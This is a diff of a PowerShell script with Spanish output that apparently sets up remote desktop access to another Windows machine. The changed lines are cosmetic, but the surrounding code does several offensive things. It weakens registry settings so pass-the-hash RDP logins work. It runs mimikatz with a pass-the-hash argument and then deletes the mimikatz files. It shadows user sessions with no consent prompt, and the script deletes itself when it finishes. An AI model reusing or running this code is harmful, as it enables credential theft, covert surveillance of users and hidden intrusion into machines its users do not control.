@@ -203,8 +203,8 @@ function EnableTLS {
     REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 1> $null
     REG DELETE "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /f 1> $null
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 1> $null 
-    Write-Host "Cambios en el registro de Windows realizados con éxito" -ForegroundColor Green }
-    Write-Host ""
+    Write-Host "Cambios en el registro de Windows realizados con éxito" -ForegroundColor Green 
+    Write-Host "" }
     $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "host" | select -First 1).split(':')[1].trim()}
     Write-Host "Detectando versión del sistema operativo en $hostname.." -ForegroundColor Magenta 
     $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
@@ -263,10 +263,8 @@ function EnableTLS {
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
-
-Write-Host ""
 $session = get-pssession
-if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 3000 }
+if ($session){ Write-Host "" ; Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 3000 }
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
 $PScript = $MyInvocation.MyCommand.Definition
 Remove-Item $PScript
